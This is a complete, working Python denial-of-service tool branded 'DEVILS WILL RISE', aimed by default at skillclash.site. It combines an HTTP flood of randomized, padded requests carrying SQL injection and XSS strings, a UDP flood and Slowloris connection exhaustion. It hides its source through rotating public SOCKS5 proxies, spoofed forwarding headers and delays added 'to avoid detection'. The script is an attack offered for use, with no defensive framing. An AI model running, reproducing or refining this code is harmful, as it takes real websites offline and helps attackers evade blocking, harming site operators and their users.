#!/usr/bin/env python3
import socket
import struct
import threading
import time
import random
import requests
import gzip
import json
import base64
import hashlib
import os
import sys
from urllib.parse import urlencode, quote_plus
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from datetime import datetime
import queue

# ==================== COLORS ====================
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    RESET = '\033[0m'

# ==================== CONFIG ====================
TARGET = os.environ.get('TARGET', 'https://skillclash.site')
THREADS = int(os.environ.get('THREADS', 800))
PROXY_PORT = 8872
PROXY_FILE = 'proxies.txt'

# Stats counters
stats = {
    'requests': 0,
    'success': 0,
    'failed': 0,
    'bytes_sent': 0,
    'errors': 0,
    'proxies_used': 0
}
stats_lock = threading.Lock()
running = True

# ==================== PROXY FETCHER ====================
def fetch_proxies():
    sources = [
        'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all',
        'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/main/socks5.txt',
        'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt',
        'https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt',
        'https://proxylist.geonode.com/api/proxy-list?limit=500&page=1&protocols=socks5'
    ]
    all_proxies = []
    for url in sources:
        try:
            r = requests.get(url, timeout=5)
            lines = r.text.splitlines()
            all_proxies.extend([l.strip() for l in lines if l.strip()])
        except:
            pass
    all_proxies = list(set(all_proxies))
    valid = [p for p in all_proxies if ':' in p and len(p.split(':')) == 2]
    with open(PROXY_FILE, 'w') as f:
        f.write('\n'.join(valid))
    return valid

def auto_refresh_proxies():
    while running:
        try:
            proxies = fetch_proxies()
            with stats_lock:
                stats['proxies_used'] = len(proxies)
        except:
            pass
        time.sleep(30)

# ==================== PROXY SERVER ====================
def handle_socks5_client(client_socket):
    try:
        data = client_socket.recv(2)
        if not data or data[0] != 0x05:
            client_socket.close()
            return
        client_socket.sendall(b'\x05\x00')
        data = client_socket.recv(4)
        if len(data) < 4 or data[1] != 0x01:
            client_socket.close()
            return
        addr_type = data[3]
        if addr_type == 0x01:
            addr = socket.inet_ntoa(client_socket.recv(4))
            port = struct.unpack('>H', client_socket.recv(2))[0]
        elif addr_type == 0x03:
            domain_len = client_socket.recv(1)[0]
            domain = client_socket.recv(domain_len).decode()
            port = struct.unpack('>H', client_socket.recv(2))[0]
            addr = socket.gethostbyname(domain)
        else:
            client_socket.close()
            return
        remote = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        remote.connect((addr, port))
        client_socket.sendall(b'\x05\x00\x00\x01' + socket.inet_aton(addr) + struct.pack('>H', port))
        
        def pipe(src, dst):
            try:
                while True:
                    data = src.recv(4096)
                    if not data:
                        break
                    dst.sendall(data)
            except:
                pass
            finally:
                src.close()
                dst.close()
        
        threading.Thread(target=pipe, args=(client_socket, remote), daemon=True).start()
        threading.Thread(target=pipe, args=(remote, client_socket), daemon=True).start()
    except:
        client_socket.close()

def start_proxy_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('0.0.0.0', PROXY_PORT))
    server.listen(500)
    while running:
        try:
            client, _ = server.accept()
            threading.Thread(target=handle_socks5_client, args=(client,), daemon=True).start()
        except:
            pass

# ==================== PAYLOADS ====================
def generate_payload():
    t = random.choice(['json', 'xml', 'form', 'binary', 'compressed', 'multipart'])
    if t == 'json':
        return {'data': {'id': random.randint(1,999999), 'payload': 'A'*random.randint(100,5000)}}
    elif t == 'xml':
        return f'<?xml version="1.0"?><root><id>{random.randint(1,999999)}</id><data>{"X"*random.randint(500,5000)}</data></root>'
    elif t == 'form':
        return {f'f{i}': 'Z'*random.randint(100,1000) for i in range(random.randint(20,100))}
    elif t == 'binary':
        return bytes([random.randint(0,255) for _ in range(random.randint(1000,10000))])
    elif t == 'multipart':
        boundary = '----WebKitFormBoundary' + ''.join(random.choices('abcdef0123456789', k=16))
        parts = []
        for i in range(random.randint(5, 20)):
            parts.append(f'--{boundary}\r\nContent-Disposition: form-data; name="field{i}"\r\n\r\n{"X"*random.randint(100,2000)}\r\n')
        parts.append(f'--{boundary}--\r\n')
        return ('multipart/form-data; boundary=' + boundary, ''.join(parts))
    else:
        return gzip.compress(json.dumps({'x': 'X'*random.randint(5000,20000)}).encode())

def generate_headers():
    headers = {
        'User-Agent': random.choice([
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) Firefox/124.0',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) Safari/605.1.15',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Edge/124.0.0.0'
        ]),
        'Accept': random.choice(['application/json,*/*', 'text/html,*/*', 'application/xml,*/*']),
        'Accept-Encoding': random.choice(['gzip, deflate, br', 'gzip, deflate']),
        'X-Forwarded-For': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
        'X-Real-IP': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Connection': random.choice(['keep-alive', 'close'])
    }
    # Random custom headers
    for _ in range(random.randint(1, 5)):
        headers[f'X-Custom-{random.randint(1000,9999)}'] = 'A'*random.randint(10, 100)
    return headers

def generate_path():
    paths = ['/api/v1/data', '/wp-admin/admin-ajax.php', '/index.php', '/login', '/search', '/products', '/cart', '/checkout']
    path = random.choice(paths)
    params = {
        'id': random.randint(1,999999),
        'page': random.randint(1,1000),
        'cb': str(random.randint(100000,999999)),
        't': str(int(time.time()*1000)),
        'rand': random.randint(100000,999999)
    }
    # Add SQL injection patterns
    if random.random() > 0.7:
        params['sql'] = f"{random.randint(1,100)}' OR '1'='1"
    if random.random() > 0.7:
        params['xss'] = f"<script>alert('{random.randint(1,100)}')</script>"
    return path + '?' + urlencode(params)

def load_proxies():
    try:
        with open(PROXY_FILE, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    except:
        return []

# ==================== STATS DISPLAY ====================
def display_stats():
    global running
    start_time = time.time()
    last_requests = 0
    last_time = start_time
    
    while running:
        time.sleep(1)
        with stats_lock:
            req = stats['requests']
            succ = stats['success']
            fail = stats['failed']
            bytes_sent = stats['bytes_sent']
            err = stats['errors']
            proxies = stats['proxies_used']
        
        current_time = time.time()
        elapsed = current_time - start_time
        rps = (req - last_requests) / (current_time - last_time)
        last_requests = req
        last_time = current_time
        
        # Clear line and print stats
        sys.stdout.write('\033[2J\033[H')  # Clear screen
        
        print(f"{Colors.RED}{Colors.BOLD}╔══════════════════════════════════════════════════════════════╗{Colors.RESET}")
        print(f"{Colors.RED}{Colors.BOLD}║                    🔥 DDOS ATTACK LIVE 🔥                    ║{Colors.RESET}")
        print(f"{Colors.RED}{Colors.BOLD}╚══════════════════════════════════════════════════════════════╝{Colors.RESET}")
        print()
        print(f"{Colors.CYAN}🎯 Target:{Colors.RESET} {TARGET}")
        print(f"{Colors.CYAN}⏱️  Uptime:{Colors.RESET} {int(elapsed)}s")
        print(f"{Colors.CYAN}🧵 Threads:{Colors.RESET} {THREADS}")
        print()
        print(f"{Colors.GREEN}📊 STATISTICS:{Colors.RESET}")
        print(f"  {Colors.BOLD}Requests:{Colors.RESET} {req:,}  {Colors.GREEN}(+{rps:.1f}/s){Colors.RESET}")
        print(f"  {Colors.GREEN}✓ Success:{Colors.RESET} {succ:,}")
        print(f"  {Colors.RED}✗ Failed:{Colors.RESET} {fail:,}")
        print(f"  {Colors.YELLOW}⚠ Errors:{Colors.RESET} {err:,}")
        print(f"  {Colors.PURPLE}📦 Data Sent:{Colors.RESET} {bytes_sent/1024/1024:.2f} MB")
        print(f"  {Colors.BLUE}🌐 Proxies:{Colors.RESET} {proxies:,}")
        print()
        
        # Progress bar
        total = req + err
        if total > 0:
            success_rate = (succ / total) * 100 if total > 0 else 0
            bar_len = 50
            filled = int(bar_len * success_rate / 100)
            bar = '█' * filled + '░' * (bar_len - filled)
            print(f"  Success Rate: {Colors.GREEN if success_rate > 70 else Colors.YELLOW if success_rate > 40 else Colors.RED}{bar} {success_rate:.1f}%{Colors.RESET}")
        print()
        print(f"{Colors.DIM}Press Ctrl+C to stop{Colors.RESET}")

# ==================== FLOOD ENGINE ====================
def flood_worker(worker_id):
    global running
    sess = requests.Session()
    retries = Retry(total=0, backoff_factor=0)
    sess.mount('http://', HTTPAdapter(max_retries=retries))
    sess.mount('https://', HTTPAdapter(max_retries=retries))
    
    last_proxy_rotate = time.time()
    proxy_list = load_proxies()
    
    while running:
        try:
            # Rotate proxy every 10 seconds
            if time.time() - last_proxy_rotate > 10:
                proxy_list = load_proxies()
                last_proxy_rotate = time.time()
            
            if proxy_list:
                proxy = random.choice(proxy_list)
                sess.proxies = {
                    'http': f'socks5://{proxy}',
                    'https': f'socks5://{proxy}'
                }
            
            url = TARGET + generate_path()
            headers = generate_headers()
            payload = generate_payload()
            method = random.choice(['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD'])
            
            # Send request
            start_time = time.time()
            if method in ['GET', 'DELETE', 'OPTIONS', 'HEAD']:
                r = sess.request(method, url, headers=headers, timeout=3)
            else:
                if isinstance(payload, dict):
                    r = sess.request(method, url, headers=headers, json=payload, timeout=3)
                elif isinstance(payload, tuple):  # multipart
                    content_type, data = payload
                    headers['Content-Type'] = content_type
                    r = sess.request(method, url, headers=headers, data=data, timeout=3)
                else:
                    r = sess.request(method, url, headers=headers, data=payload, timeout=3)
            
            # Update stats
            with stats_lock:
                stats['requests'] += 1
                if r.status_code < 400:
                    stats['success'] += 1
                else:
                    stats['failed'] += 1
                stats['bytes_sent'] += len(r.request.body or b'') + len(str(r.request.headers))
            
            # Random delay to avoid detection
            time.sleep(random.uniform(0.0005, 0.002))
            
            # If got blocked, switch proxy immediately
            if r.status_code in [403, 429, 502, 503, 504]:
                with stats_lock:
                    stats['errors'] += 1
                sess.proxies = {}
                time.sleep(0.1)
                
        except Exception as e:
            with stats_lock:
                stats['errors'] += 1
                stats['requests'] += 1
            time.sleep(random.uniform(0.001, 0.01))

# ==================== UDP FLOOD ====================
def udp_flood_worker():
    global running
    while running:
        try:
            target_ip = TARGET.replace('https://', '').replace('http://', '').split('/')[0]
            port = 80 if 'http://' in TARGET else 443
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            data = random._urandom(1024 * random.randint(1, 10))
            sock.sendto(data, (target_ip, port))
            with stats_lock:
                stats['requests'] += 1
                stats['bytes_sent'] += len(data)
            time.sleep(random.uniform(0.0001, 0.001))
        except:
            pass

# ==================== SLOWLORIS ====================
def slowloris_worker():
    global running
    while running:
        try:
            target_ip = TARGET.replace('https://', '').replace('http://', '').split('/')[0]
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            port = 80 if 'http://' in TARGET else 443
            sock.connect((target_ip, port))
            sock.send(f"GET /?{random.randint(0, 999999)} HTTP/1.1\r\n".encode())
            sock.send(f"Host: {target_ip}\r\n".encode())
            sock.send("User-Agent: Mozilla/5.0\r\n".encode())
            # Keep connection open
            while running:
                sock.send(f"X-Header: {random.randint(1, 999999)}\r\n".encode())
                time.sleep(random.uniform(5, 15))
        except:
            pass

# ==================== MAIN ====================
if __name__ == '__main__':
    print(f"{Colors.RED}{Colors.BOLD}╔══════════════════════════════════════════════════════════════╗{Colors.RESET}")
    print(f"{Colors.RED}{Colors.BOLD}║              💀 DEVILS WILL RISE - ULTIMATE 💀               ║{Colors.RESET}")
    print(f"{Colors.RED}{Colors.BOLD}╚══════════════════════════════════════════════════════════════╝{Colors.RESET}")
    print()
    print(f"{Colors.CYAN}🎯 Target:{Colors.RESET} {TARGET}")
    print(f"{Colors.CYAN}🧵 Threads:{Colors.RESET} {THREADS}")
    print(f"{Colors.CYAN}🔥 Proxy port:{Colors.RESET} {PROXY_PORT}")
    print()
    
    # Start proxy fetcher
    threading.Thread(target=auto_refresh_proxies, daemon=True).start()
    
    # Start proxy server
    threading.Thread(target=start_proxy_server, daemon=True).start()
    
    # Wait for proxies
    print(f"{Colors.YELLOW}⏳ Loading proxies...{Colors.RESET}")
    time.sleep(3)
    
    # Launch HTTP flood threads
    print(f"{Colors.GREEN}🚀 Launching HTTP flood with {THREADS} threads...{Colors.RESET}")
    for i in range(int(THREADS * 0.7)):
        threading.Thread(target=flood_worker, args=(i,), daemon=True).start()
    
    # Launch UDP flood threads (30% of total)
    udp_threads = int(THREADS * 0.2)
    print(f"{Colors.GREEN}🚀 Launching UDP flood with {udp_threads} threads...{Colors.RESET}")
    for _ in range(udp_threads):
        threading.Thread(target=udp_flood_worker, daemon=True).start()
    
    # Launch Slowloris threads (10% of total)
    slow_threads = int(THREADS * 0.1)
    print(f"{Colors.GREEN}🚀 Launching Slowloris with {slow_threads} threads...{Colors.RESET}")
    for _ in range(slow_threads):
        threading.Thread(target=slowloris_worker, daemon=True).start()
    
    print()
    print(f"{Colors.RED}{Colors.BOLD}🔥 ATTACK STARTED! PRESS CTRL+C TO STOP{Colors.RESET}")
    print()
    
    # Start stats display
    try:
        display_stats()
    except KeyboardInterrupt:
        running = False
        print(f"\n{Colors.RED}🛑 Stopping attack...{Colors.RESET}")
        time.sleep(1)
        print(f"{Colors.GREEN}✅ Attack stopped. Final stats:{Colors.RESET}")
        with stats_lock:
            print(f"Total Requests: {stats['requests']:,}")
            print(f"Successful: {stats['success']:,}")
            print(f"Failed: {stats['failed']:,}")
            print(f"Data Sent: {stats['bytes_sent']/1024/1024:.2f} MB")
        sys.exit(0)
